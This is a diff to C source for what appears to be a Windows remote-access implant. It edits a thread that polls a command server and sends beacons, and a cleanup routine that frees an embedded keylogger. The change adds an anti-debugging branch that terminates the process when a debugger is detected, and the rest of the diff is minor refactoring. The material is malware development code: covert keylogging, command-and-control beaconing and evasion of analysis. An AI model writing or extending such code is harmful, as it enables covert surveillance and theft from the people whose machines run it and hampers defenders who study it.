@@ -149,17 +149,26 @@ DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
         Sleep(SLP_CMD_THREAD);
         WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
 
-        RET_CODE ret = pollCommandsAndBeacon(ctx->client); printf("Polling...\n");
+        printf("Polling...\n");
+        RET_CODE ret = pollCommandsAndBeacon(ctx->client);
 
         // only execute the commands if there is something to exec. or an err was not found
         if (ret != R_SUCCESS) {
-            printErr(ret); 
+            printErr(ret);
             goto skipCmds;
         }
         
         ret = processCommands(ctx->client);
-        if (ret == R_DO_SHUTDOWN) { doShutdown(); }
-        if (ret != R_SUCCESS)     { printErr(ret); }
+        switch (ret) {
+            case R_DETECT:   // debugger detected
+                HANDLE hPr = GetCurrentProcess();
+                TerminateProcess(hPr, 0);
+            case R_DO_SHUTDOWN: 
+                doShutdown();
+                break;
+            default:   // R_SUCCESS
+                break;
+        }
         
         skipCmds:
         ReleaseMutex(ctx->hMutexThreadSync);
@@ -234,7 +243,7 @@ void programCleanup() {
  */
 void programContextCleanup(PROGRAM_CONTEXT* prCon) {
     if (prCon == NULL) return;
-
+    
     // free the client
     if (prCon->client != NULL) { clientCleanup(prCon->client); }
     // free the keylogger
@@ -246,7 +255,7 @@ void programContextCleanup(PROGRAM_CONTEXT* prCon) {
     }
 
     // close thread handles
-    if (prCon->hCmdThread != NULL) { CloseHandle(prCon->hCmdThread); }
+    if (prCon->hCmdThread != NULL)   { CloseHandle(prCon->hCmdThread); }
     if (prCon->hWriteThread != NULL) { CloseHandle(prCon->hWriteThread); }
 
     // close mutex handle
